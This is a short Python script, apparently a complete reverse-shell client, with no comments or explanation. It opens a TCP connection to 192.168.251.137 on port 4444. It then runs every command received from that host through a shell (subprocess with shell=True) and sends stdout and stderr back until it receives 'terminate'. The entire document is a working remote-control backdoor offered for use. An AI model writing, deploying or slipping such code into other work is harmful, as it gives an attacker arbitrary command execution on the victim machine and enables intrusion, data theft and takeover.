import socket
import subprocess
import os
host = '192.168.251.137'
port = 4444
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
s.send(b'Connected\n')
while True:
	command = s.recv(1024).decode('utf-8')
	if 'terminate' in command:
		s.close()
		break
	else:
		CMD = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
		s.send(CMD.stdout.read())
		s.send(CMD.stderr.read())
